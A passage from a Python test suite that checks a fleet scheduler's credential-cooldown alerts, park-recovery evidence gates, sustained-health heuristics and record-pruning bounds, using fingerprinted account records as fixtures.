        credential_state(credential_states(
            [{"account": ah, "exit_class": CLASS_AUTH, "ts": now + FUTURE_SKEW_SECONDS + 60},
             {"account": ah, "exit_class": CLASS_AUTH, "ts": now + FUTURE_SKEW_SECONDS + 61}],
            now), ah),
        CREDENTIAL_UNPROVEN)
    # prune must not let the MAX_RECORDS cap erase the evidence: the dead run is the ONLY thing
    # holding the account out, and its #596 cooldown has already expired here (unlike the live-
    # cooldown row above, whose `active` entry is what used to protect these records).
    dead_flood = two_auth + [rec("anthropic", f"d{i:03d}", SUCCESS, dt=100 + i)
                             for i in range(MAX_RECORDS + 5)]
    # [#699] Read at a point where the whole fixture has aged PAST the retention floor, so the
    # COUNT cap is what would evict the dead run — a dead credential's evidence is not time-bounded
    # the way a live backoff is, so this is the guard's real regime and it stays non-vacuous
    # (without the #639 preservation the two oldest records, the auth run, are the first evicted).
    dead_now = now + RETENTION_FLOOR_SECONDS + 1000
    dead_window = prune(dead_flood, dead_now)
    chk("prune retains a PROVEN-DEAD run under a 200+ record flood (no silent readmission)",
        (len(dead_window) <= MAX_RECORDS,
         auth_cooldowns(dead_window, dead_now),
         credential_state(credential_states(dead_window, dead_now), ah)),
        (True, {}, CREDENTIAL_DEAD))
    # ---- the ops alert: ONE alert per (condition, provider), naming FINGERPRINTS only -----------
    openai_fleet = {"openai": {ah}}
    auth_actions = classify_records(two_auth, openai_fleet, now + 120)
    chk("the auth cooldown FIRES the account-auth-cooldown alert",
        fires(auth_actions, "account-auth-cooldown", "openai"), True)
    auth_action = next(a for a in auth_actions if a["condition"] == "account-auth-cooldown")
    chk("the firing action carries the salted fingerprint", auth_action["accounts"], [ah])
    # Idempotence is the (condition, provider) marker: the SAME single action for a 5-run outage,
    # so _upsert_alert refreshes ONE issue instead of alerting per failed run.
    many_auth = [rec("openai", "codex01", "auth", dt=i * 10, run=f"a{i}") for i in range(5)]
    many_actions = [a for a in classify_records(many_auth, openai_fleet, now + 60)
                    if a["condition"] == "account-auth-cooldown"]
    chk("5 auth runs still produce exactly ONE alert action (not one per run)",
        (len(many_actions), many_actions[0]["fire"], many_actions[0]["accounts"]),
        (1, True, [ah]))
    chk("the alert marker is keyed per (condition, provider) so the upsert dedupes",
        _marker("account-auth-cooldown", "openai"),
        f"<!-- {MARKER_PREFIX}:account-auth-cooldown:openai -->")
    # RECOVERY: the credential works again -> the action recovers and the alert closes.
    chk("a success recovers the cooldown alert (fire=False)",
        [a["fire"] for a in classify_records(
            two_auth + [rec("openai", "codex01", SUCCESS, dt=90, run="s2")], openai_fleet,
            now + 120) if a["condition"] == "account-auth-cooldown"], [False])
    chk("a single auth does not fire the alert",
        fires(classify_records(one_auth, openai_fleet, now + 60),
              "account-auth-cooldown", "openai"), False)
    # BODY: fingerprint + the required maintainer action; NEVER a raw handle or email; and the
    # public route redacts it entirely.
    auth_body = render_body(auth_action, "jeswr")
    chk("the alert body names the fingerprint", ah in auth_body, True)
    chk("the alert body carries NO raw handle",
        any(h in auth_body for h in ("codex01", "acct01", "@gmail", "acct0")), False)
    chk("the alert body names the required maintainer action",
        "re-mint" in auth_body.lower() and "#596" in auth_body, True)
    chk("the alert body says it is a bounded cooldown, not a disable",
        "cooldown" in auth_body and "NOT a permanent disable" in auth_body, True)
    chk("the PUBLIC (redacted) route suppresses the fingerprint",
        ah in render_body(auth_action, "jeswr", redact=True), False)
    # LADDER SEPARATION: an auth outcome is NOT a decline. The #500 no-change discriminator and the
    # dispatch decline ladder both key on CLASS_NO_CHANGE, so auth records can never advance them.
    # Structurally, an auth record cannot even CARRY the decline evidence field the ladders read.
    chk("make_record refuses to attach no-change decline evidence to an auth record",
        _raises(lambda: rec("openai", "codex01", "auth", issue=500)), True)
    # And a hand-forged one (bypassing make_record) still cannot advance either ladder.
    auth_as_declines = [dict(rec("openai", "codex01", "auth", dt=i * 10, run=f"d{i}"), issue=500)
                        for i in range(NO_CHANGE_LIMIT_MIN + 2)]
    chk("auth records never satisfy the #500 no-change limit discriminator",
        _no_change_limit_view(auth_as_declines, now + 60)[1], {})
    chk("auth records are never derived to limit-class (no capped-account escalation)",
        {r["exit_class"] for r in _no_change_limit_view(auth_as_declines, now + 60)[0]},
        {CLASS_AUTH})
    chk("a genuine no_change run of the same length DOES satisfy it (ladder still works)",
        bool(_no_change_limit_view(
            [rec("openai", "codex01", CLASS_NO_CHANGE, dt=i * 10, run=f"n{i}", issue=500 + i)
             for i in range(NO_CHANGE_LIMIT_MIN)], now + 60)[1]), True)

    # ---- [registry #614] capacity_recovery_evidence: the CAUSE-RECOVERY gate that lets a
    # MACHINE capacity park re-admit itself. Derived from THIS window (no parallel health store);
    # every ambiguity yields None, which park_policy reads as "stay parked". ------------------
    parked = now + 100            # the park application instant, epoch seconds
    outage_then_fix = [rec("openai", "codex01", "auth", dt=0, run="6001.1"),
                       rec("openai", "codex01", "auth", dt=50, run="6002.1"),
                       rec("openai", "codex01", SUCCESS, dt=200, run="6003.1")]
    evidence = capacity_recovery_evidence(outage_then_fix, parked, now + 300)
    chk("the failing-then-recovered account is proven recovery evidence",
        (evidence or {}).get("key"), f"openai/{ah}/6003.1")
    chk("the evidence names the recovery instant in canonical Z-form and the cleared cause",
        ((evidence or {}).get("recovered_at"), (evidence or {}).get("cause")),
        (_iso_z(now + 200), CLASS_AUTH))
    chk("the evidence key carries NO raw handle (locked decision 22a)",
        "codex01" in (evidence or {}).get("key", ""), False)
    chk("the evidence key is park-receipt safe (no whitespace, no marker terminator)",
        bool(re.fullmatch(r"[A-Za-z0-9._=/:-]{1,120}", (evidence or {}).get("key", ""))), True)
    # (c) NO post-park success => no evidence (the cause has not demonstrably cleared).
    chk("an account still failing after the park yields NO evidence",
        capacity_recovery_evidence(outage_then_fix[:2], parked, now + 300), None)
    chk("a success BEFORE the park proves nothing (it predates the starvation)",
        capacity_recovery_evidence(
            [rec("openai", "codex01", "auth", dt=0, run="a1"),
             rec("openai", "codex01", SUCCESS, dt=50, run="s1")], parked, now + 300), None)
    chk("a success exactly AT the park instant is not STRICTLY after it",
        capacity_recovery_evidence(
            [rec("openai", "codex01", "auth", dt=0, run="a1"),
             rec("openai", "codex01", SUCCESS, dt=100, run="s1")], parked, now + 300), None)
    # SPECIFICITY: a success from an account that was NOT failing when the park landed is not
    # evidence about this park's cause — otherwise "the fleet looks healthy" would clear any park.
    chk("a healthy account's success is not evidence about the park's cause",
        capacity_recovery_evidence(
            [rec("openai", "codex01", SUCCESS, dt=0, run="s0"),
             rec("openai", "codex01", SUCCESS, dt=200, run="s1")], parked, now + 300), None)
    chk("an account with no record at all before the park proves nothing",
        capacity_recovery_evidence(
            [rec("openai", "codex01", SUCCESS, dt=200, run="s1")], parked, now + 300), None)
    chk("a success that FOLLOWS a success on the failing account still counts once the "
        "pre-park record is a launch failure",
        (capacity_recovery_evidence(outage_then_fix + [
            rec("openai", "codex01", SUCCESS, dt=260, run="6004.1")], parked,
            now + 300) or {}).get("key"), f"openai/{ah}/6003.1")
    # #604 INTEGRATION: an account the auth cooldown is still holding back has NOT recovered.
    cooling = [rec("openai", "codex01", "auth", dt=0, run="a1"),
               rec("openai", "codex01", SUCCESS, dt=200, run="s1"),
               rec("openai", "codex01", "auth", dt=250, run="a2"),
               rec("openai", "codex01", "auth", dt=260, run="a3")]
    chk("an ACTIVE auth cooldown (#604) blocks the recovery claim",
        (bool(auth_cooldowns(cooling, now + 300)),
         capacity_recovery_evidence(cooling, parked, now + 300)), (True, None))
    chk("a FLAPPING account proves nothing even once the cooldown expires: the success must "
        "out-date the LAST failure, not merely blink green once",
        capacity_recovery_evidence(cooling, parked,
                                   now + 260 + AUTH_COOLDOWN_SECONDS + 1), None)
    chk("... and a success AFTER that flap does prove recovery (cause cleared and stayed clear)",
        (capacity_recovery_evidence(
            cooling + [rec("openai", "codex01", SUCCESS, dt=400, run="s2")], parked,
            now + 500) or {}).get("key"), f"openai/{ah}/s2")
    # (d) an UNREADABLE / ambiguous window yields None — never an optimistic read.
    chk("a malformed record anywhere in the window => NO evidence (stay parked)",
        capacity_recovery_evidence(
            outage_then_fix + [{"ts": "nope", "provider": "openai", "account": ah,
                                "exit_class": SUCCESS, "run_id": "x", "model_alias": ""}],
            parked, now + 300), None)
    chk("a hand-forged unknown exit_class anywhere => NO evidence",
        capacity_recovery_evidence(
            outage_then_fix + [dict(rec("openai", "codex01", SUCCESS, dt=210, run="s9"),
                                    exit_class="totally-new")], parked, now + 300), None)
    chk("an unreadable window (None / not a list / empty) => NO evidence",
        [capacity_recovery_evidence(bad, parked, now + 300)
         for bad in (None, {}, [], "records")], [None] * 4)
    chk("an unknown park instant can never be out-dated => NO evidence",
        [capacity_recovery_evidence(outage_then_fix, bad, now + 300)
         for bad in (None, "2026-07-25T02:19:49Z", float("nan"), float("inf"), True)],
        [None] * 5)
    # A forged-FUTURE success cannot spring a park (same skew rule as every other walk).
    chk("a future-forged success is not recovery evidence",
        capacity_recovery_evidence(
            [rec("openai", "codex01", "auth", dt=0, run="a1"),
             rec("openai", "codex01", SUCCESS, dt=FUTURE_SKEW_SECONDS + 3600, run="s1")],
            parked, now + 300), None)
    # DETERMINISM: the EARLIEST qualifying recovery wins, across accounts.
    two_recoveries = [rec("openai", "codex01", "auth", dt=0, run="a1"),
                      rec("openai", "codex02", "auth", dt=10, run="b1"),
                      rec("openai", "codex02", SUCCESS, dt=150, run="b2"),
                      rec("openai", "codex01", SUCCESS, dt=200, run="a2")]
    chk("the earliest qualifying recovery wins deterministically",
        (capacity_recovery_evidence(two_recoveries, parked, now + 300) or {}).get("key"),
        f"openai/{other_h}/b2")
    chk("every launch-fail class can be the cleared cause (auth/billing/limit/transient)",
        [bool(capacity_recovery_evidence(
            [rec("openai", "codex01", cls, dt=0, run="f1"),
             rec("openai", "codex01", SUCCESS, dt=200, run="s1")], parked, now + 300))
         for cls in sorted(LAUNCH_FAIL_CLASSES)], [True] * len(LAUNCH_FAIL_CLASSES))
    chk("a SETUP failure (runner fault, not provider access) is not a starvation cause",
        capacity_recovery_evidence(
            [rec("openai", "codex01", CLASS_SETUP, dt=0, run="f1"),
             rec("openai", "codex01", SUCCESS, dt=200, run="s1")], parked, now + 300), None)
    # ---- DISPATCH STARVATION is a park cause too (sparq-org/sparq#3809) ----------------------
    # The park class this gate exists to release includes "N consecutive fix dispatches missed",
    # whose recorded cause is `zero-dispatch` on the fleet pseudo-account, NOT a launch failure.
    # Before this, such a park could never prove its cause cleared and stayed parked forever
    # (MEASURED: every capacity park in production logged "no recorded recovery of the park's
    # starvation cause" on every tick since the automatic path shipped).
    starved_then_dispatched = [rec("fleet", "fleet01", CLASS_ZERO_DISPATCH, dt=0, run="z1"),
                               rec("fleet", "fleet01", SUCCESS, dt=200, run="d1")]
    chk("a DISPATCH-STARVATION park proves recovery when dispatch launches again",
        (capacity_recovery_evidence(starved_then_dispatched, parked, now + 300)
         or {}).get("cause"), CLASS_ZERO_DISPATCH)
    chk("zero-dispatch is a park starvation cause but NOT a provider-outage launch failure",
        (CLASS_ZERO_DISPATCH in PARK_STARVATION_CLASSES,
         CLASS_ZERO_DISPATCH in LAUNCH_FAIL_CLASSES), (True, False))
    chk("every launch-fail class remains a park starvation cause",
        LAUNCH_FAIL_CLASSES <= PARK_STARVATION_CLASSES, True)
    # The widening changes WHICH outage can be proven recovered, never HOW strictly: every other
    # condition applies to zero-dispatch unchanged.
    chk("a still-starved fleet (no post-park dispatch) yields NO evidence",
        capacity_recovery_evidence(starved_then_dispatched[:1], parked, now + 300), None)
    chk("a dispatch success BEFORE the park proves nothing",
        capacity_recovery_evidence(
            [rec("fleet", "fleet01", CLASS_ZERO_DISPATCH, dt=0, run="z1"),
             rec("fleet", "fleet01", SUCCESS, dt=50, run="d1")], parked, now + 300), None)
    chk("a FLAPPING fleet (starved again after the success) yields NO evidence",
        capacity_recovery_evidence(
            starved_then_dispatched
            + [rec("fleet", "fleet01", CLASS_ZERO_DISPATCH, dt=250, run="z2")],
            parked, now + 300), None)

    # ---- park_cause_provable: the legacy-migration precondition -----------------------------
    # Converting a park out of the human terminal is only an improvement if the machine class can
    # release it. A park applied while the fleet was HEALTHY can never satisfy condition 1, so
    # migrating then would trade a visible stall for a silent one.
    chk("a park applied while the cause is OBSERVABLE is provable (migration admitted)",
        park_cause_provable(starved_then_dispatched, parked, now + 300), True)
    chk("a park applied while the fleet is HEALTHY is NOT provable (migration deferred)",
        park_cause_provable(
            [rec("fleet", "fleet01", CLASS_ZERO_DISPATCH, dt=0, run="z1"),
             rec("fleet", "fleet01", SUCCESS, dt=50, run="d1")], parked, now + 300), False)
    chk("a park applied BEFORE every record in the window is NOT provable "
        "(the outage aged out — no future success can recover it)",
        park_cause_provable(starved_then_dispatched, now - WINDOW_SECONDS - 1, now + 300), False)
    chk("an empty/unreadable window is NOT provable (fail toward not migrating)",
        [park_cause_provable([], parked, now + 300),
         park_cause_provable([{"account": "x"}], parked, now + 300),
         park_cause_provable(starved_then_dispatched, None, now + 300)], [False, False, False])
    # The precondition must AGREE with the gate it is a precondition for: anything the evidence
    # gate can ever admit must be reported provable.
    chk("provable is implied by actual evidence (the precondition never contradicts the gate)",
        all(park_cause_provable(window, parked, now + 300)
            for window in ([rec("openai", "codex01", cls, dt=0, run="f1"),
                            rec("openai", "codex01", SUCCESS, dt=200, run="s1")]
                           for cls in sorted(PARK_STARVATION_CLASSES))), True)

    # ---- [registry #691] THE AGED-OUT PARK EXIT ---------------------------------------------
    # The gap the two predicates above leave: a park whose own cause is UNOBTAINABLE (older than
    # the 48 h window, or applied while the fleet was healthy) has no machine exit at all, so a
    # transient outage becomes a permanent stall. sustained_fleet_health_evidence is the LABELLED
    # HEURISTIC that gives it one. Every check below is a guard whose deletion or inversion makes
    # a NAMED line here go red.
    h_now = now + 7 * 3600                          # the instant the predicate is evaluated
    h_span_start = h_now - SUSTAINED_HEALTH_SPAN_SECONDS
    aged_park = now - WINDOW_SECONDS - 1            # the #691 shape: older than the whole window
    # COVERAGE ANCHOR: one record older than the span, so the window reaches back as far as the
    # health claim does. It sits OUTSIDE the span, so it is never counted as span evidence.
    h_base = [rec("fleet", "fleet01", SUCCESS, dt=0, run="z0")]
    # Six successes across two accounts, ending 5 minutes before the evaluation instant.
    h_wins = ([rec("openai", "codex01", SUCCESS, dt=7 * 3600 - 300 - 600 * k, run=f"s{k}")
               for k in range(3)]
              + [rec("anthropic", "acct02", SUCCESS, dt=7 * 3600 - 600 - 600 * k, run=f"t{k}")
                 for k in range(3)])
    healthy = h_base + h_wins
    aged_evidence = sustained_fleet_health_evidence(healthy, aged_park, h_now)
    ah2 = account_hash("acct02", salt)
    chk("a park whose cause aged out is released by SUSTAINED fleet health (the #691 liveness "
        "fix): the anchor is the newest success",
        (aged_evidence or {}).get("key"), f"fleet-health/openai/{ah}/s0")
    chk("the aged-out evidence is namespaced, labelled `aged-out`, and stamped at the anchor",
        ((aged_evidence or {}).get("cause"), (aged_evidence or {}).get("recovered_at")),
        (SUSTAINED_HEALTH_CAUSE, _iso_z(now + 7 * 3600 - 300)))
    chk("the aged-out evidence key carries NO raw handle and is receipt-safe",
        ("codex01" in (aged_evidence or {}).get("key", ""),
         bool(re.fullmatch(r"[A-Za-z0-9._=/:-]{1,120}", (aged_evidence or {}).get("key", "")))),
        (False, True))
    chk("the recovery stamp is strictly after the park application (by construction — condition "
        "1 forces parked_at <= span_start and only post-span_start successes are counted)",
        (now + 7 * 3600 - 300) > aged_park, True)
    # zero-dispatch is DELIBERATELY not ill health: the allocator finding nothing to launch fires
    # constantly in normal operation (measured: 34 of the live ledger's 200 records). Widen
    # _fleet_health_ok from LAUNCH_FAIL_CLASSES to PARK_STARVATION_CLASSES and this goes red —
    # and the predicate becomes unsatisfiable in production, which is a stall dressed as a guard.
    chk("a zero-dispatch tick INSIDE the span does not refuse the aged-out exit",
        bool(sustained_fleet_health_evidence(
            healthy + [rec("fleet", "fleet01", CLASS_ZERO_DISPATCH, dt=7 * 3600 - 2000,
                           run="z9")],
            aged_park, h_now)), True)
    # GUARD: a LAUNCH FAILURE INSIDE THE SPAN. Delete the span clause of _fleet_health_ok and
    # this goes red. One `auth` is below AUTH_COOLDOWN_MIN, so this exercises the span clause
    # alone, not the (deliberately redundant) cooldown clause.
    chk("a single launch failure INSIDE the proven span refuses the aged-out exit",
        sustained_fleet_health_evidence(
            healthy + [rec("openai", "codex01", CLASS_AUTH, dt=7 * 3600 - 4000, run="f9")],
            aged_park, h_now), None)
    # GUARD: an account that failed just BEFORE the span and never came back. Its failure is
    # outside the span, so only the newest-record-per-account clause catches it.
    chk("an account still SITTING on a launch failure (failed before the span, silent since) "
        "refuses the aged-out exit",
        sustained_fleet_health_evidence(
            healthy + [rec("anthropic", "acct09", CLASS_LIMIT, dt=1200, run="f8")],
            aged_park, h_now), None)
    # GUARD: the positive-evidence counts. ASSERT THE BOUNDS THEMSELVES FIRST, then size every
    # fixture from a LITERAL. A fixture sized from the constant under test shrinks with the
    # constant and keeps passing when the floor is lowered — the mutant survives (measured: it
    # did, on the first cut of this very test).
    chk("the positive-evidence floors are the documented ones",
        (SUSTAINED_HEALTH_MIN_SUCCESSES, SUSTAINED_HEALTH_MIN_ACCOUNTS), (6, 2))
    chk("FIVE successes in the span refuses the exit (the floor is 6)",
        sustained_fleet_health_evidence(h_base + h_wins[:5], aged_park, h_now), None)
    chk("EIGHT successes from ONE account refuses the exit (the floor is 2 distinct accounts)",
        sustained_fleet_health_evidence(
            h_base + [rec("openai", "codex01", SUCCESS, dt=7 * 3600 - 300 - 600 * k, run=f"o{k}")
                      for k in range(8)],
            aged_park, h_now), None)
    # THE `fleet` PSEUDO-PROVIDER IS NOT A SECOND ACCOUNT (review of PR #697). It writes under a
    # FIXED sentinel hash, so counting raw `account` values let ONE real account plus the
    # dispatcher clear a floor that exists precisely to require more than one real account.
    # Demonstrated by execution against the first cut, and live-prevalent: 43 of today's 200
    # records are `fleet` successes. Delete the provider filter and this goes red.
    fleet_sentinel = hashlib.sha256(b"fleet-zero-dispatch").hexdigest()[:16]

    def fleet_rec(cls, dt, run):
        return make_record(FLEET_PSEUDO_PROVIDER, fleet_sentinel, "", cls, run, now + dt)

    one_real_plus_fleet = (
        h_base
        + [rec("openai", "codex01", SUCCESS, dt=7 * 3600 - 300 - 600 * k, run=f"p{k}")
           for k in range(3)]
        + [fleet_rec(SUCCESS, 7 * 3600 - 600 - 600 * k, f"q{k}") for k in range(3)])
    chk("the `fleet` PSEUDO-account is not a second real account: one real account plus the "
        "dispatcher does NOT clear the distinct-account floor",
        sustained_fleet_health_evidence(one_real_plus_fleet, aged_park, h_now), None)
    # ...but its successes still COUNT toward the total, because a `fleet` success means the
    # allocator planned AND launched work — genuine evidence about the dispatch starvation these
    # parks are mostly made of. Two real accounts + fleet must still fire.
    chk("a `fleet` success still counts toward MIN_SUCCESSES once two REAL accounts are present",
        bool(sustained_fleet_health_evidence(
            h_base + h_wins[:4] + [fleet_rec(SUCCESS, 7 * 3600 - 900 - 600 * k, f"u{k}")
                                   for k in range(2)],
            aged_park, h_now)), True)
    # ...and it may also ANCHOR freshness on its own. This half was documented intent but
    # untested (review round 3 of PR #697 caught it as a surviving mutant). It is deliberate and
    # live-reachable: a `fleet` success means the allocator PLANNED AND LAUNCHED work, which is a
    # present-tense claim about the dispatch starvation these parks are mostly made of. Here the
    # two REAL accounts' successes are all older than SUSTAINED_HEALTH_FRESH_SECONDS, so the only
    # fresh success — and therefore the anchor, the key and the stamp — is the dispatcher's.
    fleet_anchored = (
        h_base
        + [rec("openai", "codex01", SUCCESS, dt=7 * 3600 - 3700 - 600 * k, run=f"v{k}")
           for k in range(2)]
        + [rec("anthropic", "acct02", SUCCESS, dt=7 * 3600 - 4000 - 600 * k, run=f"x{k}")
           for k in range(2)]
        + [fleet_rec(SUCCESS, 7 * 3600 - 300 - 60 * k, f"y{k}") for k in range(2)])
    fleet_ev = sustained_fleet_health_evidence(fleet_anchored, aged_park, h_now)
    chk("a `fleet` success may ANCHOR freshness alone when every real account's success is older "
        "(the dispatcher launching work IS a present-tense health claim)",
        ((fleet_ev or {}).get("key"), (fleet_ev or {}).get("provider")),
        (f"{SUSTAINED_HEALTH_KEY_PREFIX}/{FLEET_PSEUDO_PROVIDER}/{fleet_sentinel}/y0",
         FLEET_PSEUDO_PROVIDER))
    # GUARD: freshness. SILENCE IS NOT HEALTH — the same six successes, all early in the span.
    stale = h_base + [rec("openai", "codex01", SUCCESS, dt=3700 + 60 * k, run=f"e{k}")
                      for k in range(3)] \
        + [rec("anthropic", "acct02", SUCCESS, dt=3900 + 60 * k, run=f"g{k}") for k in range(3)]
    chk("a fleet that succeeded early in the span and went SILENT refuses the exit "
        "(freshness: health is a present-tense claim)",
        sustained_fleet_health_evidence(stale, aged_park, h_now), None)
    chk("a FORGED FUTURE success cannot manufacture that freshness",
        sustained_fleet_health_evidence(
            stale + [rec("openai", "codex01", SUCCESS, dt=7 * 3600 + 4000, run="fut")],
            aged_park, h_now), None)
    # GUARD: coverage. Drop the anchor and the window no longer reaches back as far as the claim.
    chk("a window that does not COVER the span it would claim refuses the exit "
        "(no claiming six healthy hours from four observed ones)",
        sustained_fleet_health_evidence(h_wins, aged_park, h_now), None)
    # GUARD: the park must be older than the span — a fresh park is the STRONG gate's business.
    chk("a park younger than the span is refused here (the cause-recovery gate owns it)",
        sustained_fleet_health_evidence(healthy, h_span_start + 1, h_now), None)
    chk("a park exactly at the span boundary is admitted (the bound is <=, not <)",
        bool(sustained_fleet_health_evidence(healthy, h_span_start, h_now)), True)
    # GUARD: fail closed on every ambiguity, exactly like the gate it sits beside.
    chk("an unreadable / empty / malformed window and an unusable park stamp all refuse",
        [sustained_fleet_health_evidence([], aged_park, h_now),
         sustained_fleet_health_evidence("nope", aged_park, h_now),
         sustained_fleet_health_evidence(healthy + [{"account": "x"}], aged_park, h_now),
         sustained_fleet_health_evidence(healthy, None, h_now),
         sustained_fleet_health_evidence(healthy, float("inf"), h_now)],
        [None, None, None, None, None])
    # ---- the MIGRATION-side reachability twins ----------------------------------------------
    chk("the aged-out exit is REACHABLE while the fleet is observed healthy",
        sustained_health_exit_reachable(healthy, h_now), True)
    chk("it is NOT reachable on an unreadable/empty window, a stale fleet, or an account "
        "sitting on a launch failure",
        [sustained_health_exit_reachable([], h_now),
         sustained_health_exit_reachable(healthy + [{"account": "x"}], h_now),
         sustained_health_exit_reachable(stale, h_now),
         sustained_health_exit_reachable(
             healthy + [rec("anthropic", "acct09", CLASS_LIMIT, dt=1200, run="f8")], h_now)],
        [False, False, False, False])
    # park_exit_reachable is the disjunction the migration asks. Each disjunct alone suffices,
    # and neither being available defers the migration exactly as before #691.
    strong_only = [rec("openai", "codex01", CLASS_AUTH, dt=7 * 3600 - 60, run="a1")]
    chk("the STRONG exit alone makes a park reachable (an observable cause, unhealthy fleet)",
        (park_cause_provable(strong_only, h_now, h_now),
         sustained_health_exit_reachable(strong_only, h_now),
         park_exit_reachable(strong_only, h_now, h_now)), (True, False, True))
    chk("the AGED-OUT exit alone makes a park reachable (healthy fleet, no observable cause) — "
        "this is precisely the case that could not migrate before #691",
        (park_cause_provable(healthy, h_now, h_now),
         sustained_health_exit_reachable(healthy, h_now),
         park_exit_reachable(healthy, h_now, h_now)), (False, True, True))
    chk("neither exit reachable => the migration still defers (an unreadable ledger)",
        [park_exit_reachable([], h_now, h_now),
         park_exit_reachable(stale, h_now, h_now)], [False, False])
    # THE BUSY-LEDGER FAIL-OPEN (review round 3 of PR #697). COVERAGE is not waitable: it is
    # MAX_RECORDS / record-rate, so a park can never age into it and a busier fleet makes it
    # worse. Omitting it from the reachability twin let the migration convert a park into a class
    # whose evidence gate returns None FOREVER — measured None at +1, +2, +4 and +8 spans on a
    # 62 rec/h window. This fixture is that window: MAX_RECORDS perfectly healthy successes
    # across two real accounts, arriving fast enough that the retained window covers only ~3.2 h.
    busy_rate_gap = 3600.0 / 62.1
    busy = sorted(
        (rec("openai" if i % 2 else "anthropic", "codex01" if i % 2 else "acct02", SUCCESS,
             dt=int(7 * 3600 - i * busy_rate_gap), run=f"b{i}") for i in range(MAX_RECORDS)),
        key=lambda r: r["ts"])
    busy_coverage_h = round((h_now - busy[0]["ts"]) / 3600.0, 2)
    chk("the busy-ledger fixture really is under-covered (the fixture, not the guard, is what "
        "makes this case real)",
        (busy_coverage_h < SUSTAINED_HEALTH_SPAN_SECONDS / 3600, len(busy)),
        (True, MAX_RECORDS))
    chk("a fleet HEALTHY but too BUSY to cover the span makes the aged-out exit UNREACHABLE — "
        "the migration must not convert a park whose exit can never open",
        (sustained_fleet_health_evidence(busy, aged_park, h_now),
         sustained_health_exit_reachable(busy, h_now),
         park_exit_reachable(busy, h_now, h_now)), (None, False, False))
    # ...and it stays shut however long the park waits, which is what makes it a SILENT stall
    # rather than a delay. Delete the coverage check in the twin and this pair goes red.
    chk("waiting does not open it: the same rate yields no evidence at +1 and +4 spans",
        [sustained_fleet_health_evidence(
            [dict(r, ts=r["ts"] + k * SUSTAINED_HEALTH_SPAN_SECONDS) for r in busy],
            h_now, h_now + k * SUSTAINED_HEALTH_SPAN_SECONDS) for k in (1, 4)],
        [None, None])
    # THE AGREEMENT INVARIANT. The migration precondition and the admission probe must not drift:
    # a park the migration converts NOW must actually be releasable LATER. Simulate it — convert
    # at h_now (reachable above), then run the window forward one span with the same health.
    later = h_now + SUSTAINED_HEALTH_SPAN_SECONDS
    continued = healthy + [
        rec("openai", "codex01", SUCCESS, dt=13 * 3600 - 300 - 600 * k, run=f"c{k}")
        for k in range(3)] + [
        rec("anthropic", "acct02", SUCCESS, dt=13 * 3600 - 600 - 600 * k, run=f"d{k}")
        for k in range(3)]
    chk("a park the migration converts on a reachable exit IS released one span later "
        "(precondition and admission agree end to end)",
        bool(sustained_fleet_health_evidence(continued, h_now, later)), True)

    # ---- prune / window bound ---------------------------------------------------------------
    # [#699] The count cap now binds only OUTSIDE the retention floor, so this fixture is placed
    # there; inside the floor the cap deliberately no longer evicts (that is the fix), which the
    # dedicated floor tests below assert directly.
    many = [rec("anthropic", "acct01", CLASS_TRANSIENT, dt=i - RETENTION_FLOOR_SECONDS - 1000)
            for i in range(MAX_RECORDS + 50)]
    chk("prune caps to MAX_RECORDS outside the retention floor",
        len(prune(many, now + MAX_RECORDS + 100)), MAX_RECORDS)
    old_new = [rec("anthropic", "a", CLASS_AUTH, dt=-(WINDOW_SECONDS + 10)),
               rec("anthropic", "a", CLASS_AUTH, dt=0)]
    chk("prune drops out-of-window", len(prune(old_new, now)), 1)

    # ---- ACTIVE-BACKOFF RETENTION across the MAX_RECORDS cap (issue #82, fix-forward #62) ----
    # End-to-end regression: an openai rate-limit hit with a 5 h reset hint, followed by 200+
    # LATER unrelated records, must still be enforced after pruning — before the fix the global
    # newest-MAX_RECORDS cap evicted the hit, so account_backoffs on the pruned window derived {}
    # and the capped account was readmitted hours early.
    hint_hit = [rec("openai", "codex01", "rate-limit", dt=0, reset="in 5 hours")]
    # [#699] CEILING-scale, and deliberately so — see ceiling_flood's docstring. A live backoff
    # record is now inside the retention floor by construction, so a MAX_RECORDS-scale flood would
    # evict nothing and every assertion below would hold with the preservation code DELETED.
    flood = ceiling_flood("bulk", 30)
    window, window_err = prune_loud(hint_hit + flood, now + 1000)
    chk("live 5 h backoff survives a flood that reaches the RETENTION CEILING",
        account_backoffs(window, now + 1000).get(ah, {}).get("backoff_until"),
        now + BACKOFF_CAP_SECONDS)
    chk("retention keeps the window bounded at the absolute ceiling, loudly",
        (len(window), "RETENTION CEILING BINDING" in window_err),
        (RETENTION_CEILING_RECORDS, True))
    nc_window, _ = prune_loud(nc_distinct + flood, now + 500)
    chk("active derived no_change backoff retains its three-record evidence across the cap",
        (sum(1 for record in nc_window
             if record["account"] == ah and record["exit_class"] == CLASS_NO_CHANGE),
         account_backoffs(nc_window, now + 500).get(ah, {}).get("last_signal")),
        (3, CLASS_LIMIT))
    # a short consecutive chain is preserved WHOLE, so the doubled multiplier re-derives exactly
    chain = [rec("openai", "codex01", "rate-limit", dt=i * 30) for i in range(3)]
    cb = account_backoffs(prune_loud(chain + flood, now + 500)[0], now + 500)
    chk("consecutive chain preserved across the cap (multiplier intact)",
        (cb.get(ah, {}).get("consecutive"), cb.get(ah, {}).get("backoff_until")),
        (3, now + 60 + 4 * BACKOFF_BASE_SECONDS))
    # a chain PAST cap-saturation keeps only its BACKOFF_CHAIN_KEEP tail — same derived
    # backoff_until (the exponential is capped either way), bound stays hard
    long_chain = [rec("openai", "codex01", "rate-limit", dt=i * 10) for i in range(20)]
    lwindow, _ = prune_loud(long_chain + flood, now + 500)
    chk("saturated chain truncates to its tail yet derives the same capped backoff",
        (len(lwindow), account_backoffs(lwindow, now + 500).get(ah, {}).get("backoff_until")),
        (RETENTION_CEILING_RECORDS, now + 190 + BACKOFF_CAP_SECONDS))
    chk("chain-keep is the cap-saturation count", BACKOFF_CHAIN_KEEP, 6)
    # ...but truncation FLOORS the re-derived consecutive count at BACKOFF_CHAIN_KEEP (a 20-hit
    # chain re-derives as 6 — PR #85 finding 2), so a saturated count is only a LOWER BOUND and
    # the state says so; consumers render "x6+", never an exact "x6".
    lb = account_backoffs(lwindow, now + 500).get(ah, {})
    chk("truncated 20-hit chain: consecutive floors at chain-keep, flagged saturated",
        (lb.get("consecutive"), lb.get("saturated")), (BACKOFF_CHAIN_KEEP, True))
    lb_full = account_backoffs(long_chain, now + 500).get(ah, {})
    chk("untruncated 20-hit chain: exact count, still flagged saturated (>= chain-keep)",
        (lb_full.get("consecutive"), lb_full.get("saturated")), (20, True))
    chk("short chain: exact count, NOT saturated",
        (cb.get(ah, {}).get("consecutive"), cb.get(ah, {}).get("saturated")), (3, False))
